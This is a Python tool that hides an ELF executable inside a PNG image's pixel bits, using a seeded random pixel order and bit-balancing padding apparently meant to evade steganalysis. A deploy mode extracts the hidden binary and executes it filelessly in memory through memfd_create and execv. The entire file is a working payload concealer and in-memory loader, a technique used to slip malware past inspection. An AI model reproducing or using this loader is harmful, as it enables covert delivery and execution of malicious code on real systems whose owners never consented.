#!/usr/bin/env python3

'''
Authors: Patrick Kelly (patrickyunen@gmail.com) and Garbo Loo
Last Updated: 3-18-2020
'''

import binascii
import os
import random
import argparse
import ctypes
import ctypes.util
from PIL import Image
from bitstring import BitArray


delimiter = 256 * '1'


#Convert the executable payload to a bitstream
def get_bitstream(filename):
    fh = open(filename, 'rb')
    binary_file = fh.read()
    return BitArray(binary_file).bin


#Append a delimiter of N 1's to the end of bitstring
def add_delimiter(bitstring, N=256):
    for i in range(N):
        bitstring += '1'
    return bitstring


#Get total number of LSBs in image
def image_bits(image):
    x_size = image.size[0]
    y_size = image.size[1]
    return x_size, y_size


#Balance the proportion of 1s and 0s in the payload
def smoothing(bitstream, total_size):
    zeros = bitstream.count('0')
    ones = bitstream.count('1')
    unfilled = total_size - len(bitstream)
    zeros_weight = ((total_size/2) - zeros)/unfilled
    ones_weight = ((total_size/2) - ones)/unfilled
    for index in range(unfilled):
        bitstream += str(random.choices(population=[0,1], weights=[zeros_weight,ones_weight])[0])
    return bitstream


#Generate a pseudorandom list of tuples (x, y, rgb_value) with each tuple uniquely
#designating a random rgb value at a random x,y coordinate in the image. The list
#has length <streamlength> and is reproducible with seed <rand_seed>
def pix_list(image, rand_seed, x_size, y_size):
    random.seed(rand_seed)
    colors = ['r', 'b', 'g']
    output_list = []
    totalsize = x_size * y_size * 3 #Multiply by 3 to account for each of the rgb channels
    pix_list = list(range(totalsize))
    random.shuffle(pix_list) #Shuffle to generate nonrepeating list of <totalsize> integers
    for index in range(totalsize): #Each integer corresponds to a unique (x,y,color) tuple
        color = colors[pix_list[index] % 3]
        x = (pix_list[index] // 3) % x_size
        y = (pix_list[index] // 3) // x_size
        newpix = (x, y, color)
        output_list.append(newpix)
    return output_list


#Replace the red, green, or blue LSB of each successive pixel in code_list with the correponding
#bitstream bit
def encode(image, bitstream, pixel_list, output):
    rgbs = image.convert('RGB')
    pixels = image.load()
    #Iterate over the nonduplicate, randomly-ordered tuples in pixel_list
    for index in range(len(bitstream)):
        pixel_tuple = pixel_list[index]
        x = pixel_tuple[0]
        y = pixel_tuple[1]
        r,g,b = pixels[x,y]

        #Insert current bitstream bit into the indicated rgb value
        if pixel_tuple[2] == 'r':
            r_zero = (r & 0xFE) #Zero the LSB of the r value
            new_bit = int(bitstream[index]) #Get the next bitstream bit
            pixels[x,y] = (r_zero ^ new_bit, g, b) #XOR it with the LSB-zeroed r value
        elif pixel_tuple[2] == 'g':
            g_zero = (g & 0xFE)
            new_bit = int(bitstream[index])
            pixels[x,y] = (r, g_zero ^ new_bit, b)
        elif pixel_tuple[2] == 'b':
            b_zero = (b & 0xFE)
            new_bit = int(bitstream[index])
            pixels[x,y] = (r, g, b_zero ^ new_bit)
    image.save(output)
    return image


def extract(image, code_list, delimiter_length=256):
    rgbs = image.convert('RGB')
    pixels = image.load()
    message = ''
    ones_counter = 0 #To be used to check for the delimiter string

    for index in range(len(code_list)):
        pixel_tuple = code_list[index]
        x = pixel_tuple[0]
        y = pixel_tuple[1]
        color = pixel_tuple[2]
        r,g,b = rgbs.getpixel((x,y))

        if color == 'r':
            LSB = str(r & 1) #If color = 'r', use bitmask to retrieve the LSB
        elif color == 'g':
            LSB = str(g & 1)
        else:
            LSB = str(b & 1)

        message += LSB #Add the LSB to the message

        #Now check for the delimiter
        if LSB == '1':
            ones_counter += 1
        else:
            ones_counter = 0
        if ones_counter == delimiter_length:
            return message

    #If there's no delimiter, there's no message. Exit the script.
    exit(0)


#Execute the extracted binary in RAM
def execute(file_bytes):
    libc = ctypes.cdll.LoadLibrary(ctypes.util.find_library('c'))
    fd = libc.syscall(319, b' ', 1) #Use memfd_create syscall to create a file descriptor in memory
    assert fd >= 0

    #Write the binary to the fd and execute it
    f1 = file_bytes
    f2 = open('/proc/self/fd/' + str(fd), mode='wb')
    f2.write(f1)
    f2.close()
    os.execv('/proc/self/fd/' + str(fd), ['test'])


#Conceal the executable payload in the image
def concealer(image, payload, seed, output_name):
    im = Image.open(image)
    bitstream = add_delimiter(get_bitstream(payload))
    x_size, y_size = image_bits(im)
    totalsize = x_size * y_size * 3
    bitstream = smoothing(bitstream, totalsize)
    encoding_list = pix_list(im, seed, x_size, y_size)
    image = encode(im, bitstream, encoding_list, output_name)


#Extract the payload from the stego image
def deployer(image, seed):
    im = Image.open(image)
    x_size, y_size = image_bits(im)
    encoding_list = pix_list(im, seed, x_size, y_size)
    message = extract(im, encoding_list)
    delimit_index = message.find(delimiter)
    output = message[:delimit_index]
    return output


def main():
    #Command line options (-c,-d,-i,-p,-o,-s) with argparse module:
    parser = argparse.ArgumentParser()

    group = parser.add_mutually_exclusive_group()
    group.add_argument("-c", "--conceal", action="store_true", help="conceal ELF file in image; use with -i, -p, -o")
    group.add_argument("-d", "--deploy", action="store_true", help="extract ELF file from image and execute in memory; use with -i")
    parser.add_argument("-i", "--image", type=str, help="image input required as argument", metavar='<image file>')
    parser.add_argument("-p", "--payload", type=str, help="elf executable file required as argument", metavar='<elf file>')
    parser.add_argument("-o", "--output", type=str, help="save your output file in PNG format", metavar='<output file name.png>')
    parser.add_argument("-s", "--seed", type=str, help="seed for reproducible initiation of the PRNG that determines the pixel sequence.")
    parser.add_argument("-g", "--histogram", action="store_true", help="display histogram of superimposed input and output PNGs")

    args = parser.parse_args()

    #Set variables with command-line inputs
    conceal = args.conceal
    deploy = args.deploy
    in_image = args.image
    in_payload = args.payload
    outfile = args.output
    rand_seed = args.seed
    histogram = args.histogram

    #Runtime
    if conceal:
        concealer(in_image, in_payload, rand_seed, outfile)
        #if -g, display a histogram of input and output images superimposed
        if histogram:
            import histogram
            h = histogram.Histogram()
            h.images = [in_image, outfile]
            h.plotter()
    elif deploy:
        result = deployer(in_image, rand_seed)
        hex_chars = hex(int(result, 2))
        file_bytes = binascii.a2b_hex(hex_chars[2:])
        execute(file_bytes)


if __name__ == '__main__':
    main()
